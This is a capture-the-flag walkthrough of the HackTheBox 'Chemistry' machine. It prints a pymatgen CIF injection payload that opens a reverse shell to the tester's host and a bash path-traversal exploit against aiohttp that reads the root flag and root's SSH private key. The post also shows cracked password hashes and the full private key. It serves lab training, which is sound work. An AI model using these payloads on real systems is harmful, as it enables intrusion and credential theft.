---
title: HackTheBox - Chemistry
date: 2025-03-08 15:00:00 +/-0000
categories: [HackTheBox, Linux]
tags: [hackthebox, easy, web, linux]     # TAG names should always be lowercase
description: In Chemistry we attack a Linux host starting by exploiting a RCE in a CIFs analyzer python application.
image: "/assets/img/posts/chemistry/chemistry.webp"
---


Chemistry from Hack the Box involves exploiting a vulnerability in a CIFs parser which is running using python. We can leverage the vulnerability to get a reverse shell in the context of the application allowing us access to the filesystem.

After initial access we can dump the `sqlite3` database to obtain user credentials.

From here we find another web application listening locally which is running a vulnerable python library. As the application is running as root we can exploit a path traversal vulnerability to read any file on the system.

## Nmap

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Chemistry]
└─$ nmap -sV -sC -p- 10.129.123.63 -Pn -v 
<SNIP>
Nmap scan report for 10.129.123.63
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```

Starting off with the usual nmap scan we find two open ports, Noting that it is interesting to see the Werkzeug python web app running on port 5000. 

Accessing the application we can see it is running a `CIF Analyzer` and we already know that this is using `Werkzeug` so its likely a python flask app.

## Web Application

![](/assets/img/posts/chemistry/Pasted%20image%2020250308115344.png)

We are allowed to freely register an account with no authentication required which brings us to an upload page which also presents us with an example CIF document to test it with.

![](/assets/img/posts/chemistry/Pasted%20image%2020250308115604.png)

After playing around with the app for a bit and a lot googling I came across this potential code execution vulnerability online : https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f

This write-up details being able to execute arbitrary code by adding the following payload and replacing `touch pwned` with your payload.

```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

## Remote Code execution

I found that I was able to modify the example CIF file provided and combine it with the exploit described in the write up to get a reverse shell.

```Bash
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy


 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.64/6666 0>&1\'");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

After uploading the file and attempting to view it we can see that we get a connection back on our `netcat` listener.

![](/assets/img/posts/chemistry/Pasted%20image%2020250308124808.png)

## Finding credentials

Now that we have access as `app` we can start enumerating the file system. In the users home folder we find a `sqlite` data base and we identify that our potential target user is `rosa`.

```bash
app@chemistry:~/instance$ cat /etc/passwd | grep sh$
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

```bash
app@chemistry:~$ ls -la
ls -la
total 52
drwxr-xr-x 8 app  app  4096 Oct  9 20:18 .
drwxr-xr-x 4 root root 4096 Jun 16  2024 ..
-rw------- 1 app  app  5852 Oct  9 20:08 app.py
lrwxrwxrwx 1 root root    9 Jun 17  2024 .bash_history -> /dev/null
-rw-r--r-- 1 app  app   220 Jun 15  2024 .bash_logout
-rw-r--r-- 1 app  app  3771 Jun 15  2024 .bashrc
drwxrwxr-x 3 app  app  4096 Jun 17  2024 .cache
drwx------ 2 app  app  4096 Mar  8 12:47 instance
drwx------ 7 app  app  4096 Jun 15  2024 .local
-rw-r--r-- 1 app  app   807 Jun 15  2024 .profile
lrwxrwxrwx 1 root root    9 Jun 17  2024 .sqlite_history -> /dev/null
drwx------ 2 app  app  4096 Oct  9 20:13 static
drwx------ 2 app  app  4096 Oct  9 20:18 templates
drwx------ 2 app  app  4096 Mar  8 12:47 uploads
app@chemistry:~$ cd instance
cd instance
app@chemistry:~/instance$ ls
ls
database.db
```

To access this database we first need to update into a better shell and luckily we already know python is on this box.

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
app@chemistry:~$ cd instance    
cd instance
app@chemistry:~/instance$ ls
ls
database.db
app@chemistry:~/instance$ sqlite3 database.db
sqlite3 database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> 
```

From here we can begin enumerating the database, During which we find the users table for the web application which contains a hash for the user `rosa`

```bash
sqlite> .show
.show
        echo: off
         eqp: off
     explain: auto
     headers: off
        mode: list
   nullvalue: ""
      output: stdout
colseparator: "|"
rowseparator: "\n"
       stats: off
       width: 
    filename: database.db
sqlite> .tables
.tables
structure  user     
sqlite> .dump user
.dump user
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
);
INSERT INTO user VALUES(1,'admin','2861debaf8d99436a10ed6f75a252abf');
INSERT INTO user VALUES(2,'app','197865e46b878d9e74a0346b6d59886a');
INSERT INTO user VALUES(3,'rosa','63ed86ee9f624c7b14f1d4f43dc251a5');
INSERT INTO user VALUES(4,'robert','02fcf7cfc10adc37959fb21f06c6b467');
INSERT INTO user VALUES(5,'jobert','3dec299e06f7ed187bac06bd3b670ab2');
INSERT INTO user VALUES(6,'carlos','9ad48828b0955513f7cf0f7f6510c8f8');
INSERT INTO user VALUES(7,'peter','6845c17d298d95aa942127bdad2ceb9b');
INSERT INTO user VALUES(8,'victoria','c3601ad2286a4293868ec2a4bc606ba3');
INSERT INTO user VALUES(9,'tania','a4aa55e816205dc0389591c9f82f43bb');
INSERT INTO user VALUES(10,'eusebio','6cad48078d0241cca9a7b322ecd073b3');
INSERT INTO user VALUES(11,'gelacia','4af70c80b68267012ecdac9a7e916d18');
INSERT INTO user VALUES(12,'fabian','4e5d71f53fdd2eabdbabb233113b5dc0');
INSERT INTO user VALUES(13,'axel','9347f9724ca083b17e39555c36fd9007');
INSERT INTO user VALUES(14,'kristel','6896ba7b11a62cacffbdaded457c6d92');
INSERT INTO user VALUES(15,'test','098f6bcd4621d373cade4e832627b4f6');
COMMIT;

```

We can then attempt to crack the users hash using hashcat. They look like they are in MD5 format so lets try that.

```bash
┌──(kryzen㉿kali)-[~]
└─$ hashcat -m 0 '63ed86ee9f624c7b14f1d4f43dc251a5' /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
<SNIP>
```

We get a hit `rosa:unicorniosrosados`

## User Flag

Using these credentials we can SSH into the box.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Chemistry]
└─$ ssh rosa@chemistry.htb 
<SNIP>
rosa@chemistry:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
rosa@chemistry:~$ hostname
chemistry
rosa@chemistry:~$ cat user.txt 
a8d28cc5e99631f72ca493ebd811d16c

```


## Privilege Escalation

Now that we have SSH access it is time to begin enumerating the machine looking for a privilege escalation vector.

Checking running processes we can see that root is running a monitoring app.

```bash
rosa@chemistry:~$ ps aux | grep root

<SNIP>
root        1011  0.0  1.3  35408 27724 ?        Ss   11:48   0:00 /usr/bin/python3.9 /opt/monitoring_site/app.py
<SNIP>
```

Checking netstat shows that the host is listening locally on `port 8080`

```bash
rosa@chemistry:~$ netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.129.123.63:44646     10.10.14.64:6666        CLOSE_WAIT  -                   
tcp        0     36 10.129.123.63:22        10.10.14.64:48808       ESTABLISHED -                   
tcp        0      1 10.129.123.63:34654     1.1.1.1:53              SYN_SENT    -                   
tcp        0      0 10.129.123.63:5000      10.10.14.64:46786       ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```

Checking with curl we can confirm that a http application is running on this port.

```bash
rosa@chemistry:~$ curl http://127.0.0.1:8080
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Monitoring</title>
    <link rel="stylesheet" href="/assets/css/all.min.css">
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">

```

We can attempt a local port forward so we can see what is running using the browser.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Chemistry]
└─$ ssh -L 1234:localhost:8080 rosa@chemistry.htb
rosa@chemistry.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
<SNIP>
```

Now if we open our browser we can attempt to access the application running on 8080 using our localhost port 1234.

![](/assets/img/posts/chemistry/Pasted%20image%2020250308130620.png)

We can see that this looks like some kind of monitoring site which also is able to list services and has some other functions.

Running `whatweb` against the application shows that it is running using Python but also `aiohttp/3.9.1` which is quite unusual.

```bash
┌──(kryzen㉿kali)-[~]
└─$ whatweb http://127.0.0.1:1234
http://127.0.0.1:1234 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[127.0.0.1], JQuery[3.6.0], Script, Title[Site Monitoring]

```

Researching this shows that it is a python library that happens to have a path transversal vulnerability, Imagine that!

The POC I located and will be using is : [link](https://github.com/z3rObyte/CVE-2024-23334-PoC) though it required some modification.

By checking the source code of the web page we could identify where the assets were being stored : `/assets/`

This results in the final POC looking like :

```bash
#!/bin/bash
  
url="http://localhost:8080"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"

    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```


We SSH back into the machine as `Rosa` without the port forward and make the script to carry out the exploit.

Running the exploit we can read the contents of the root flag.

```bash
rosa@chemistry:~$ vim exploit.sh
rosa@chemistry:~$ chmod +x exploit.sh 
rosa@chemistry:~$ ./exploit.sh 
[+] Testing with /assets/../root/root.txt
        Status code --> 404
[+] Testing with /assets/../../root/root.txt
        Status code --> 404
[+] Testing with /assets/../../../root/root.txt
        Status code --> 200
74a713a808f6b56deeda183864d35352

```

## SSH Access as root.

With a slight modification to the exploit we can instead read the root users `id_rsa` private key which should allow us to ssh into the box as the root user.

```bash
rosa@chemistry:~$ ./exploit.sh 
[+] Testing with /assets/../root/.ssh/id_rsa
        Status code --> 404
[+] Testing with /assets/../../root/.ssh/id_rsa
        Status code --> 404
[+] Testing with /assets/../../../root/.ssh/id_rsa
        Status code --> 200
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

We can then make the private key on our attack host and use it to ssh into the machine.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Chemistry]
└─$ vim id_rsa            
                                                                                                                                                                                                                                            
┌──(kryzen㉿kali)-[~/HTB/Boxes/Chemistry]
└─$ chmod 400 id_rsa                     
                                                                                                                                                                                                                                            
┌──(kryzen㉿kali)-[~/HTB/Boxes/Chemistry]
└─$ ssh root@chemistry.htb -i id_rsa 
<SNIP>
root@chemistry:~# id
uid=0(root) gid=0(root) groups=0(root)
root@chemistry:~# hostname
chemistry
```


I thought this was a very fun box though finding the initial RCE exploit was quite difficult. Even having an idea of what the potential attack vector might be it still took quite some time to locate something that worked.

 Thanks for reading!
